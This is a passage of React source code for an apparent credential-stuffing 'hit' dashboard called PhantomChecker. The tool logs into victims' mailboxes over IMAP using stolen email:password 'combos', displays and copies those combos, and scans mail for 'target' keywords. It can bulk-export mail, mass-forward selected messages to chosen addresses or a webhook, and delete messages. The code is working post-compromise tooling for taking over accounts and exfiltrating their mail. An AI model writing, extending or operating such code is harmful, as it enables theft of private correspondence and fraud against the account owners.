        setToastMessage({ type: 'error', text: `Connection error: ${err.message}` });
      }
    } finally {
      setIsFetchingLive(false);
      setTimeout(() => setLiveFetchStatus(null), 8000);
      setTimeout(() => setToastMessage(null), 4000);
    }
  };

  const handleConnectManual = (e) => {
    e.preventDefault();
    if (!manualEmail.trim() || !manualPass.trim()) return;
    const cleanEmail = manualEmail.trim();
    const cleanPass = manualPass.trim();
    setManualPasswords(prev => ({ ...prev, [cleanEmail.toLowerCase()]: cleanPass }));
    attemptedAccountsRef.current.add(cleanEmail.toLowerCase());
    if (setValidAccounts) {
      setValidAccounts(prev => prev.includes(cleanEmail) ? prev : [cleanEmail, ...prev]);
    }
    setSelectedAccount(cleanEmail);
    setShowConnectModal(false);
    handleFetchAllRealFolders(cleanEmail, cleanPass);
  };

  const handleCopyImapUri = () => {
    const uri = getImapUri(selectedAccount, password);
    navigator.clipboard?.writeText(uri);
    setCopiedImap(true);
    setTimeout(() => setCopiedImap(false), 2500);
  };

  // Delete message: non-blocking, instant UI update, moves to Trash or permanently expunges
  const handleDeleteAction = async (mailToDelete = activeMail) => {
    const targetMail = mailToDelete || activeMail;
    if (!targetMail || isDeleting) return;
    setIsDeleting(true);

    const targetId = targetMail.id;
    const targetFolder = targetMail.folder || activeFolder;
    const targetUid = targetMail.uid;
    const isAlreadyTrash = (targetFolder || '').toLowerCase() === 'trash';

    // Move selection to next available email immediately
    const remaining = filteredMails.filter(m => m.id !== targetId);
    if (activeMail && activeMail.id === targetId) {
      const currentIndex = filteredMails.findIndex(m => m.id === targetId);
      const nextMail = remaining[currentIndex] || remaining[currentIndex - 1] || remaining[0] || null;
      setSelectedMailId(nextMail ? nextMail.id : null);
    }

    if (isAlreadyTrash) {
      if (setMails) setMails(prev => prev.filter(m => m.id !== targetId));
      if (onDeleteMail) onDeleteMail(targetId);
      setToastMessage({ type: 'notice', text: 'Message permanently removed from Trash' });
    } else {
      if (setMails) {
        setMails(prev => prev.map(m => m.id === targetId ? { ...m, folder: 'Trash' } : m));
      }
      setToastMessage({ type: 'success', text: 'Message moved to Trash folder' });
    }

    try {
      fetch('/api/delete-mail', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        signal: AbortSignal.timeout(6000),
        body: JSON.stringify({
          host: imapConfig.host,
          port: imapConfig.port,
          email: selectedAccount,
          password,
          folder: targetFolder,
          serverPath: targetMail.serverPath,
          uid: targetUid,
          permanently: isAlreadyTrash
        })
      }).catch(() => {});
    } catch {}

    setTimeout(() => {
      setIsDeleting(false);
    }, 250);

    setTimeout(() => setToastMessage(null), 4000);
  };

  // Open Forward Composer Modal
  // Open Forward / Reply Composer Modal
  const handleOpenForward = (isReply = false) => {
    if (!activeMail) return;
    const recipient = isReply ? (activeMail.senderEmail || activeMail.sender || '') : '';
    const initialSubject = isReply 
      ? (activeMail.subject?.startsWith('Re:') ? activeMail.subject : `Re: ${activeMail.subject || 'No Subject'}`) 
      : (activeMail.subject?.startsWith('Fwd:') ? activeMail.subject : `Fwd: ${activeMail.subject || 'No Subject'}`);
    
    setForwardRecipient(recipient);
    setForwardSubject(initialSubject);
    setForwardNote('');
    setForwardResult(null);
    setShowForwardModal(true);
  };

  // Execute Forward / Reply
  const handleSendForward = async (e) => {
    e.preventDefault();
    if (!forwardRecipient.trim() || !activeMail) return;

    setIsSendingForward(true);
    setForwardResult(null);

    const smtpConfig = getSmtpConfigForEmail(selectedAccount);
    const isReplyMode = forwardSubject.trim().startsWith('Re:');

    try {
      const res = await fetch('/api/forward-mail', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          host: imapConfig.host,
          port: imapConfig.port,
          smtpHost: smtpConfig.host,
          smtpPort: smtpConfig.port,
          email: selectedAccount,
          password,
          to: forwardRecipient.trim(),
          subject: forwardSubject,
          note: forwardNote,
          origBodyText: activeMail.bodyText || '',
          origBodyHtml: activeMail.htmlBody || '',
          origSender: activeMail.sender ? `${activeMail.sender} <${activeMail.senderEmail || ''}>` : (activeMail.senderEmail || ''),
          origDate: activeMail.date || '',
          messageId: activeMail.messageId || '',
          isReply: isReplyMode
        })
      });

      const data = await res.json();
      if (data.success) {
        setForwardResult({ 
          type: 'success', 
          text: isReplyMode 
            ? `Reply dispatched successfully to ${forwardRecipient.trim()}!` 
            : `Message forwarded successfully to ${forwardRecipient.trim()}!` 
        });

        const newSentMail = {
          id: `${isReplyMode ? 'reply' : 'fwd'}-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`,
          email: selectedAccount,
          folder: 'Sent',
          subject: forwardSubject,
          sender: selectedAccount,
          senderEmail: selectedAccount,
          snippet: isReplyMode 
            ? `[Replied to ${forwardRecipient.trim()}] ${forwardNote || activeMail.snippet}` 
            : `[Forwarded to ${forwardRecipient.trim()}] ${forwardNote || activeMail.snippet}`,
          bodyText: isReplyMode 
            ? `${forwardNote ? forwardNote + '\n\n' : ''}On ${activeMail.date || 'earlier message'}, ${activeMail.sender || activeMail.senderEmail} wrote:\n> ${(activeMail.bodyText || '').replace(/\n/g, '\n> ')}`
            : `${forwardNote ? forwardNote + '\n\n' : ''}---------- Forwarded message ---------\nTo: ${forwardRecipient.trim()}\n\n${activeMail.bodyText}`,
          htmlBody: isReplyMode
            ? `<div>${forwardNote ? `<div style="padding:12px;background:#f0fdf4;margin-bottom:12px;border-left:4px solid #00ff9d;color:#166534;">${forwardNote}</div>` : ''}<div style="color:#64748b;font-size:12px;margin-bottom:14px;">On ${activeMail.date || 'earlier message'}, <strong>${activeMail.sender || activeMail.senderEmail}</strong> wrote:</div><blockquote style="border-left:2px solid #cbd5e1;padding-left:12px;margin:0;color:#64748b;">${activeMail.htmlBody || activeMail.bodyText}</blockquote></div>`
            : `<div>${forwardNote ? `<div style="padding:12px;background:#f0fdf4;margin-bottom:12px;border-left:4px solid #00ff9d;color:#166534;">${forwardNote}</div>` : ''}<div style="color:#64748b;font-size:12px;margin-bottom:14px;">Forwarded to <strong>${forwardRecipient.trim()}</strong></div><hr/>${activeMail.htmlBody || activeMail.bodyText}</div>`,
          date: new Date().toISOString().replace('T', ' ').substring(0, 16),
          isUnread: false,
          matchedTargets: activeMail.matchedTargets || []
        };

        if (setMails) {
          setMails(prev => [newSentMail, ...prev]);
        }

        setTimeout(() => {
          setShowForwardModal(false);
          setToastMessage({ 
            type: 'success', 
            text: isReplyMode 
              ? `✓ Reply sent to ${forwardRecipient.trim()}` 
              : `✓ Email forwarded to ${forwardRecipient.trim()}` 
          });
          setTimeout(() => setToastMessage(null), 4000);
        }, 1200);
      } else {
        setForwardResult({ type: 'error', text: data.error || 'Failed to dispatch message.' });
      }
    } catch (err) {
      setForwardResult({ type: 'error', text: `Dispatch failed: ${err.message}` });
    } finally {
      setIsSendingForward(false);
    }
  };

  // Download raw RFC822 .eml file
  const handleDownloadEml = () => {
    if (!activeMail) return;
    const rawContent = activeMail.rawMime || `From: ${activeMail.sender || ''} <${activeMail.senderEmail || ''}>\r\nTo: ${activeMail.email || ''}\r\nSubject: ${activeMail.subject || 'No Subject'}\r\nDate: ${activeMail.date || ''}\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n\r\n${activeMail.htmlBody || activeMail.bodyText || ''}`;
    const blob = new Blob([rawContent], { type: 'message/rfc822' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `${(activeMail.subject || 'message').replace(/[^a-zA-Z0-9_-]/g, '_')}.eml`;
    a.click();
    URL.revokeObjectURL(url);
  };

  // Open in system mail client (mailto:)
  const handleOpenMailto = () => {
    if (!activeMail) return;
    const subj = encodeURIComponent(forwardSubject || `Fwd: ${activeMail.subject}`);
    const body = encodeURIComponent(`${forwardNote ? forwardNote + '\n\n' : ''}---------- Forwarded message ---------\nFrom: ${activeMail.sender} <${activeMail.senderEmail}>\nSubject: ${activeMail.subject}\n\n${activeMail.bodyText}`);
    window.location.href = `mailto:${encodeURIComponent(forwardRecipient || '')}?subject=${subj}&body=${body}`;
  };

  // Copy formatted text to clipboard
  const handleCopyForwardText = () => {
    if (!activeMail) return;
    const textToCopy = `${forwardNote ? forwardNote + '\n\n' : ''}---------- Forwarded message ---------\nSubject: ${activeMail.subject}\nFrom: ${activeMail.sender} <${activeMail.senderEmail}>\nDate: ${activeMail.date}\nTo: <${activeMail.email}>\n\n${activeMail.bodyText}`;
    navigator.clipboard?.writeText(textToCopy);
    setCopiedForwardText(true);
    setTimeout(() => setCopiedForwardText(false), 2000);
  };

  // ─── Mass Selection & Forwarding Helpers ─────────────────────────────────────
  const toggleSelectMail = (id, e) => {
    if (e) e.stopPropagation();
    setSelectedMailIds(prev => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  };

  const handleSelectAllFiltered = () => {
    if (selectedMailIds.size === filteredMails.length && filteredMails.length > 0) {
      setSelectedMailIds(new Set());
    } else {
      setSelectedMailIds(new Set(filteredMails.map(m => m.id)));
    }
  };

  const handleSelectTargetHits = () => {
    const hitIds = filteredMails
      .filter(m => m.matchedTargets && m.matchedTargets.length > 0)
      .map(m => m.id);
    setSelectedMailIds(new Set(hitIds));
  };

  const handleClearSelection = () => {
    setSelectedMailIds(new Set());
  };

  // Get array of selected email objects
  const selectedMailsList = useMemo(() => {
    return currentAccountMails.filter(m => selectedMailIds.has(m.id));
  }, [currentAccountMails, selectedMailIds]);

  // Mass Copy Formatted Text to Clipboard
  const handleMassCopyText = () => {
    if (selectedMailsList.length === 0) return;
    const textDump = selectedMailsList.map((m, idx) => (
      `================================================================================\n` +
      `EMAIL #${idx + 1} | Account: ${selectedAccount} | Folder: ${m.folder} | Date: ${m.date}\n` +
      `Subject: ${m.subject}\n` +
      `From: ${m.sender} <${m.senderEmail}>\n` +
      `To: ${m.email}\n` +
      `Target Hits: ${(m.matchedTargets || []).join(', ') || 'None'}\n` +
      `--------------------------------------------------------------------------------\n` +
      `${m.bodyText || m.snippet || '(No body text)'}\n`
    )).join('\n\n');

    navigator.clipboard?.writeText(textDump);
    setToastMessage({ type: 'success', text: `✓ Copied ${selectedMailsList.length} emails with headers to clipboard!` });
    setTimeout(() => setToastMessage(null), 4000);
  };

  // Mass Download .EML Archive File
  const handleMassDownloadZip = () => {
    if (selectedMailsList.length === 0) return;
    const combinedMbox = selectedMailsList.map(m => {
      return (m.rawMime || [
        `From: <${m.senderEmail || selectedAccount}>`,
        `To: <${m.email || selectedAccount}>`,
        `Subject: ${m.subject || 'Message'}`,
        `Date: ${m.date || new Date().toUTCString()}`,
        `MIME-Version: 1.0`,
        `Content-Type: text/html; charset=utf-8`,
        '',
        m.htmlBody || `<pre>${m.bodyText || m.snippet}</pre>`
      ].join('\r\n')) + '\r\n\r\n';
    }).join('');

    const blob = new Blob([combinedMbox], { type: 'message/rfc822' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `PhantomChecker_Export_${selectedAccount.replace(/[^a-zA-Z0-9]/g, '_')}_${selectedMailsList.length}mails.eml`;
    a.click();
    URL.revokeObjectURL(url);

    setToastMessage({ type: 'success', text: `✓ Downloaded ${selectedMailsList.length} emails as .EML bundle` });
    setTimeout(() => setToastMessage(null), 4000);
  };

  // Execute Mass Forward / Webhook Relay
  const handleExecuteMassForward = async (e) => {
    if (e) e.preventDefault();
    if (selectedMailsList.length === 0) return;

    setIsSendingMassForward(true);
    setMassForwardResult(null);

    const isWebhook = massForwardMode === 'webhook';
    const smtpConfig = getSmtpConfigForEmail(selectedAccount);
    const targetRecipients = isWebhook ? [] : massForwardRecipients.split(/[\n,;]+/).map(r => r.trim()).filter(Boolean);
    const targetWebhook = isWebhook ? massWebhookUrl.trim() : '';

    // Lightweight sanitization: strip rawMime and clamp large bodies so fetch never chokes
    const sanitizedMessages = selectedMailsList.map(m => ({
      id: m.id,
      subject: m.subject || 'No Subject',
      sender: m.sender || m.senderEmail || 'Unknown',
      senderEmail: m.senderEmail || '',
      date: m.date || '',
      bodyText: (m.bodyText || '').slice(0, 10000),
      htmlBody: (m.htmlBody || '').slice(0, 35000),
      messageId: m.messageId || '',
      matchedTargets: m.matchedTargets || []
    }));

    try {
      const res = await fetch('/api/mass-forward-mail', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          host: imapConfig.host,
          port: imapConfig.port,
          smtpHost: smtpConfig.host,
          smtpPort: smtpConfig.port,
          email: selectedAccount,
          password,
          recipients: targetRecipients,
          webhookUrl: targetWebhook,
          messages: sanitizedMessages,
          note: massForwardNote,
          proxy: null
        })
      });

      const data = await res.json();
      if (data.success) {
        setMassForwardResult({
          type: 'success',
          text: `Successfully dispatched ${sanitizedMessages.length} email(s)! Delivered: ${data.successCount || sanitizedMessages.length} ${data.webhookDispatched ? '(+ Webhook Dispatched)' : ''}`
        });

        setTimeout(() => {
          setShowMassForwardModal(false);
          setSelectedMailIds(new Set());
          setToastMessage({ type: 'success', text: `✓ Mass forward completed for ${sanitizedMessages.length} emails` });
          setTimeout(() => setToastMessage(null), 4000);
        }, 1500);
      } else {
        const errMsg = data.error || (data.errors && data.errors.length > 0 ? data.errors[0] : 'Failed to dispatch mass forward.');
        setMassForwardResult({ type: 'error', text: errMsg });
      }
    } catch (err) {
      setMassForwardResult({ type: 'error', text: `Mass forward failed: ${err.message}` });
    } finally {
      setIsSendingMassForward(false);
    }
  };

  const handleAddKeyword = (e) => {
    e.preventDefault();
    if (!newKeyword.trim()) return;
    onAddTargetKeyword(newKeyword.trim());
    setSearchQuery(newKeyword.trim());
    setNewKeyword('');
  };

  const getFolderCount = (folderId) => {
    if (folderId === 'ALL') return currentAccountMails.length;
    return currentAccountMails.filter(m => (m?.folder || '').toLowerCase() === (folderId || '').toLowerCase()).length;
  };

  return (
    <div style={{
      display: 'flex',
      flexDirection: 'column',
      gap: '12px',
      height: '100%',
      minHeight: 0,
      flex: 1,
      overflow: 'hidden'
    }}>
      
      {/* Top Action & Live Webmail Bar */}
      <div className="glass-panel" style={{
        padding: '8px 14px',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'space-between',
        flexWrap: 'wrap',
        gap: '10px',
        flexShrink: 0
      }}>
        
        {/* Account Selector with Provider Badge */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
          <div style={{
            padding: '8px', borderRadius: '10px',
            background: 'linear-gradient(135deg, rgba(176,38,255,0.25), rgba(0,255,157,0.25))',
            border: '1px solid rgba(255,255,255,0.2)',
            display: 'flex', alignItems: 'center', justifyContent: 'center'
          }}>
            <Inbox size={18} color="#00ff9d" />
          </div>
          <div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '2px' }}>
              <span style={{ fontSize: '0.62rem', color: '#8b9bb4', fontFamily: "'JetBrains Mono', monospace", letterSpacing: '0.5px' }}>
                LIVE HIT MAILBOX &bull; {providerName.toUpperCase()}
              </span>
              <span className="badge-ca" style={{ fontSize: '0.58rem', padding: '1px 5px' }}>
                🇨🇦 REAL IMAP
              </span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              <select 
                value={selectedAccount}
                onChange={(e) => {
                  setSelectedAccount(e.target.value);
                  setSelectedMailId(null);
                }}
                className="glass-input" 
                style={{ fontSize: '0.78rem', fontWeight: 700, width: '270px', background: '#080c14', color: '#fff', padding: '4px 8px' }}
              >
                {mailboxes.length === 0 ? (
                  <option value="">No Live Hits Loaded Yet</option>
                ) : mailboxes.map((acc, i) => {
                  const combo = combos.find(c => c.email && c.email.trim().toLowerCase() === acc.trim().toLowerCase());
                  const accPass = combo ? combo.password : (manualPasswords[acc.trim().toLowerCase()] || '');
                  return (
                    <option key={i} value={acc}>
                      {acc}{accPass ? `:${accPass}` : ''} {acc.endsWith('.ca') ? '🇨🇦' : ''} — {getProviderName(acc)}
                    </option>
                  );
                })}
              </select>

              <button
                onClick={() => setShowConnectModal(!showConnectModal)}
                className="glass-btn glass-btn-purple"
                style={{ fontSize: '0.7rem', padding: '5px 8px', display: 'flex', alignItems: 'center', gap: '4px' }}
                title="Connect custom live IMAP combo"
              >
                <Plus size={12} /> Add Hit
              </button>

              {selectedAccount && (
                <button
                  type="button"
                  onClick={() => {
                    setSelectedAccount('');
                    setSelectedMailId(null);
                  }}
                  className="glass-btn glass-btn-green"
                  style={{ fontSize: '0.7rem', padding: '5px 10px', display: 'flex', alignItems: 'center', gap: '4px', fontWeight: 700 }}
                  title="Return to All Hits Studio Command Deck"
                >
                  <ChevronLeft size={13} /> All Hits Deck
                </button>
              )}
            </div>
          </div>
        </div>

        {/* Live Webmail & Multi-Folder Sync */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px', flexWrap: 'wrap' }}>
          
          {/* Live Webmail Portal Link */}
          {webmailUrl && selectedAccount && (
            <a 
              href={webmailUrl} 
              target="_blank" 
              rel="noopener noreferrer"
              className="glass-btn glass-btn-green"
              style={{ 
                fontSize: '0.78rem',
                display: 'inline-flex',
                alignItems: 'center',
                gap: '8px',
                textDecoration: 'none',
                padding: '8px 18px',
                fontWeight: 700,
                boxShadow: '0 0 15px rgba(0,255,157,0.25)'
              }}
            >
              <Globe size={15} /> Open Live Webmail ({providerName})
              <ExternalLink size={13} />
            </a>
          )}

          {/* Refresh Mailbox Button */}
          <button
            onClick={() => handleFetchAllRealFolders(selectedAccount, password)}
            disabled={isFetchingLive || !selectedAccount}
            className="glass-btn glass-btn-green"
            style={{ fontSize: '0.78rem', display: 'inline-flex', alignItems: 'center', gap: '6px', padding: '8px 16px', fontWeight: 700 }}
            title="Check IMAP server for new incoming emails"
          >
            <RefreshCw size={14} className={isFetchingLive ? 'animate-spin' : ''} />
            {isFetchingLive ? 'Checking IMAP...' : 'Refresh Mailbox'}
          </button>

          {/* Auto-Refresh Toggle */}
          {selectedAccount && (
            <button
              onClick={() => setAutoRefresh(!autoRefresh)}
              className="glass-btn"
              style={{
                fontSize: '0.72rem',
                display: 'inline-flex',
                alignItems: 'center',
                gap: '6px',
                padding: '8px 12px',
                color: autoRefresh ? '#00ff9d' : '#8b9bb4',
                borderColor: autoRefresh ? '#00ff9d' : 'rgba(255,255,255,0.1)',
                background: autoRefresh ? 'rgba(0, 255, 157, 0.15)' : undefined
              }}
              title={autoRefresh ? "Auto-refresh active (checking every 25s)" : "Turn on 25s auto-refresh for incoming mail"}
            >
              <span style={{
                width: '7px', height: '7px', borderRadius: '50%',
                background: autoRefresh ? '#00ff9d' : '#64748b',
                boxShadow: autoRefresh ? '0 0 8px #00ff9d' : 'none'
              }} />
              {autoRefresh ? 'Auto-Check (25s): ON' : 'Auto-Check: OFF'}
            </button>
          )}

          {lastRefreshedTime && (
            <span style={{ fontSize: '0.68rem', color: '#8b9bb4', fontFamily: "'JetBrains Mono', monospace" }}>
              Synced: {lastRefreshedTime}
            </span>
          )}

          {/* Copy IMAP URI */}
          {selectedAccount && (
            <button
              onClick={handleCopyImapUri}
              className="glass-btn"
              style={{ fontSize: '0.75rem', display: 'inline-flex', alignItems: 'center', gap: '6px', color: copiedImap ? '#00ff9d' : '#8b9bb4' }}
              title="Copy IMAP connection URI"
            >
              {copiedImap ? <CheckCircle2 size={14} color="#00ff9d" /> : <Copy size={14} />}
              {copiedImap ? 'IMAP URI Copied!' : `${imapConfig.host}:993`}
            </button>
          )}
        </div>

        {/* Search & Targets Input */}
        <form onSubmit={handleAddKeyword} style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
          <div style={{ position: 'relative', width: '200px' }}>
            <input 
              type="text" 
              placeholder="Search or add target..."
              value={newKeyword} 
              onChange={(e) => setNewKeyword(e.target.value)}
              className="glass-input" 
              style={{ fontSize: '0.75rem', paddingLeft: '32px', width: '100%' }} 
            />
            <Search size={14} color="#00ff9d" style={{ position: 'absolute', left: '10px', top: '11px' }} />
          </div>
          <button type="submit" className="glass-btn glass-btn-green" style={{ fontSize: '0.75rem', whiteSpace: 'nowrap' }}>
            + Target
          </button>
        </form>
      </div>

      {/* Manual Live Connect Popout */}
      {showConnectModal && (
        <div className="glass-panel" style={{ padding: '14px 18px', background: '#0a0e18', border: '1px solid #b026ff', flexShrink: 0 }}>
          <form onSubmit={handleConnectManual} style={{ display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap' }}>
            <div style={{ fontSize: '0.75rem', fontWeight: 700, color: '#b026ff', display: 'flex', alignItems: 'center', gap: '6px' }}>
              <Key size={14} /> CONNECT LIVE IMAP HIT:
            </div>
            <input
              type="text"
              placeholder="user@sympatico.ca / videotron.ca"
              value={manualEmail}
              onChange={(e) => setManualEmail(e.target.value)}
              className="glass-input"
              style={{ fontSize: '0.75rem', width: '260px' }}
              required
            />
            <input
              type="password"
              placeholder="Password"
              value={manualPass}
              onChange={(e) => setManualPass(e.target.value)}
              className="glass-input"
              style={{ fontSize: '0.75rem', width: '180px' }}
              required
            />
            <button type="submit" className="glass-btn glass-btn-green" style={{ fontSize: '0.75rem', padding: '6px 14px' }}>
              Connect & Fetch Real Folders
            </button>
            <button type="button" onClick={() => setShowConnectModal(false)} className="glass-btn" style={{ fontSize: '0.75rem' }}>
              Cancel
            </button>
          </form>
        </div>
      )}

      {/* Live Fetch Notification Banner */}
      {liveFetchStatus && (
        <div style={{
          padding: '8px 16px', borderRadius: '10px',
          background: liveFetchStatus.type === 'error' ? 'rgba(239,68,68,0.15)' : 'rgba(0,255,157,0.15)',
          border: `1px solid ${liveFetchStatus.type === 'error' ? 'rgba(239,68,68,0.4)' : 'rgba(0,255,157,0.4)'}`,
          color: liveFetchStatus.type === 'error' ? '#fca5a5' : '#86efac',
          fontSize: '0.76rem', fontFamily: "'JetBrains Mono', monospace",
          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
          flexShrink: 0
        }}>
          <span>{liveFetchStatus.text}</span>
          <span style={{ fontSize: '0.7rem', opacity: 0.8 }}>Server: {imapConfig.host}:993 TLS</span>
        </div>
      )}

      {/* Either Interactive Hit Command Deck OR the 3-Pane Webmail Client */}
      {!selectedAccount ? (
        <div style={{
          flex: 1,
          minHeight: 0,
          overflowY: 'auto',
          display: 'flex',
          flexDirection: 'column',
          gap: '16px',
          padding: '4px'
        }}>
          {/* Command Deck Hero Card */}
          <div className="glass-panel" style={{
            padding: '20px 24px',
            background: 'linear-gradient(135deg, rgba(0, 229, 255, 0.08), rgba(176, 38, 255, 0.08))',
            border: '1px solid rgba(0, 229, 255, 0.25)',
            borderRadius: '16px',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            flexWrap: 'wrap',
            gap: '16px'
          }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
              <div style={{
                width: '54px', height: '54px', borderRadius: '16px',
                background: 'linear-gradient(135deg, #00e5ff, #b026ff)',
                padding: '3px', boxShadow: '0 0 25px rgba(0, 229, 255, 0.35)',
                display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0
              }}>
                <img src="/phantom-ghost.png" alt="Phantom Ghost" style={{ width: '100%', height: '100%', borderRadius: '14px', objectFit: 'cover' }} />
              </div>
              <div>
                <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '4px' }}>
                  <h2 style={{ fontSize: '1.25rem', fontWeight: 900, color: '#fff', margin: 0, letterSpacing: '-0.3px' }}>
                    PHANTOM LIVE INBOX COMMAND DECK
                  </h2>
                  <span className="badge-ca" style={{ fontSize: '0.62rem', padding: '2px 7px' }}>
                    🇨🇦 / 🇺🇸 REAL IMAP
                  </span>
                </div>
                <p style={{ fontSize: '0.75rem', color: '#8b9bb4', margin: 0 }}>
                  Select any verified hit below to dive into its live IMAP folders, read incoming target emails, or dispatch mass forwarding.
                </p>
              </div>
            </div>

            {/* Metrics Chips */}
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', flexWrap: 'wrap' }}>
              <div style={{ padding: '8px 14px', borderRadius: '10px', background: 'rgba(0,0,0,0.4)', border: '1px solid rgba(0,255,157,0.3)', textAlign: 'center' }}>
                <div style={{ fontSize: '0.62rem', color: '#8b9bb4', fontFamily: "'JetBrains Mono', monospace" }}>TOTAL HITS</div>
                <div style={{ fontSize: '1.1rem', fontWeight: 800, color: '#00ff9d' }}>{mailboxes.length}</div>
              </div>
              <div style={{ padding: '8px 14px', borderRadius: '10px', background: 'rgba(0,0,0,0.4)', border: '1px solid rgba(255,0,85,0.3)', textAlign: 'center' }}>
                <div style={{ fontSize: '0.62rem', color: '#8b9bb4', fontFamily: "'JetBrains Mono', monospace" }}>CANADIAN 🇨🇦</div>
                <div style={{ fontSize: '1.1rem', fontWeight: 800, color: '#ff0055' }}>
                  {mailboxes.filter(m => m.endsWith('.ca')).length}
                </div>
              </div>
              <div style={{ padding: '8px 14px', borderRadius: '10px', background: 'rgba(0,0,0,0.4)', border: '1px solid rgba(176,38,255,0.3)', textAlign: 'center' }}>
                <div style={{ fontSize: '0.62rem', color: '#8b9bb4', fontFamily: "'JetBrains Mono', monospace" }}>TARGET HITS</div>
                <div style={{ fontSize: '1.1rem', fontWeight: 800, color: '#b026ff' }}>
                  {mails.filter(m => m.matchedTargets && m.matchedTargets.length > 0).length}
                </div>
              </div>
              <div style={{ padding: '8px 14px', borderRadius: '10px', background: 'rgba(0,0,0,0.4)', border: '1px solid rgba(0,229,255,0.3)', textAlign: 'center' }}>
                <div style={{ fontSize: '0.62rem', color: '#8b9bb4', fontFamily: "'JetBrains Mono', monospace" }}>SYNCED EMAILS</div>
                <div style={{ fontSize: '1.1rem', fontWeight: 800, color: '#00e5ff' }}>{mails.length}</div>
              </div>
            </div>
          </div>

          {/* Clean Hit Accounts Toolbar */}
          <div className="glass-panel" style={{ padding: '12px 18px', display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '16px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
              <span style={{ fontSize: '0.8rem', fontWeight: 800, color: '#fff', fontFamily: "'JetBrains Mono', monospace", letterSpacing: '0.5px' }}>
                VERIFIED HIT MAILBOXES ({mailboxes.length})
              </span>
              {mailboxes.filter(m => m.endsWith('.ca')).length > 0 && (
                <span className="badge-ca" style={{ fontSize: '0.64rem', padding: '2px 8px' }}>
                  🇨🇦 {mailboxes.filter(m => m.endsWith('.ca')).length} CANADIAN
                </span>
              )}
            </div>

            {/* Search Filter */}
            <div style={{ position: 'relative', width: '280px' }}>
              <input
                type="text"
                placeholder="Search hit accounts by email or domain..."
                value={deckSearch}
                onChange={(e) => setDeckSearch(e.target.value)}
                className="glass-input"
                style={{ fontSize: '0.74rem', paddingLeft: '30px', width: '100%', padding: '6px 12px 6px 30px' }}
              />
              <Search size={13} color="#8b9bb4" style={{ position: 'absolute', left: '10px', top: '10px' }} />
            </div>
          </div>

          {/* Hit Accounts Cards Grid */}
          {commandDeckFilteredAccounts.length > 0 ? (
            <div style={{
              display: 'grid',
              gridTemplateColumns: 'repeat(auto-fill, minmax(310px, 1fr))',
              gap: '14px'
            }}>
              {commandDeckFilteredAccounts.map((acc, i) => {
                const combo = combos.find(c => c.email && c.email.trim().toLowerCase() === acc.trim().toLowerCase());
                const accPass = combo ? combo.password : (manualPasswords[acc.trim().toLowerCase()] || '');
                const comboString = accPass ? `${acc}:${accPass}` : acc;
                const accMails = mails.filter(m => m.email.toLowerCase() === acc.toLowerCase());
                const detectedKws = Array.from(new Set(accMails.flatMap(m => m.matchedTargets || [])));
                const pName = getProviderName(acc);
                const wUrl = getWebmailUrl(acc);

                return (
                  <div
                    key={i}
                    className="glass-panel"
                    style={{
                      padding: '16px',
                      display: 'flex',
                      flexDirection: 'column',
                      justifyContent: 'space-between',
                      gap: '12px',
                      borderRadius: '14px',
                      border: '1px solid rgba(255, 255, 255, 0.08)',
                      transition: 'all 0.15s ease',
                      position: 'relative'
                    }}
                  >
                    {/* Card Header: Provider & Badges */}
                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                        <span className="badge-ca" style={{ fontSize: '0.6rem', padding: '2px 6px' }}>
                          {acc.endsWith('.ca') ? '🇨🇦 ' : ''}{pName}
                        </span>
                        <span style={{
                          fontSize: '0.62rem',
                          color: '#00e5ff',
                          fontFamily: "'JetBrains Mono', monospace",
                          background: 'rgba(0, 229, 255, 0.12)',
                          padding: '2px 6px',
                          borderRadius: '4px'
                        }}>
                          {accMails.length} msgs
                        </span>
                      </div>
                      <span style={{ fontSize: '0.62rem', color: '#8b9bb4', fontFamily: "'JetBrains Mono', monospace" }}>
                        IMAP 993 TLS
                      </span>
                    </div>

                    {/* Combo String with 1-Click Copy */}
                    <div style={{
                      background: '#070a12',
                      border: '1px solid rgba(255,255,255,0.06)',
                      borderRadius: '8px',
                      padding: '8px 10px',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      gap: '8px'
                    }}>
                      <span style={{
                        fontSize: '0.78rem',
                        fontWeight: 700,
                        color: '#fff',
                        fontFamily: "'JetBrains Mono', monospace",
                        overflow: 'hidden',
                        textOverflow: 'ellipsis',
                        whiteSpace: 'nowrap'
                      }} title={comboString}>
                        {comboString}
                      </span>
                      <button
                        onClick={() => {
                          navigator.clipboard?.writeText(comboString);
                          setToastMessage({ type: 'success', text: `Copied: ${comboString}` });
                          setTimeout(() => setToastMessage(null), 2500);
                        }}
                        className="glass-btn"
                        style={{ padding: '3px 6px', fontSize: '0.62rem', flexShrink: 0, display: 'flex', alignItems: 'center', gap: '3px' }}
                        title="Copy combo"
                      >
                        <Copy size={11} /> Copy
                      </button>
                    </div>

                    {/* Detected Targets Pills */}
                    {detectedKws.length > 0 && (
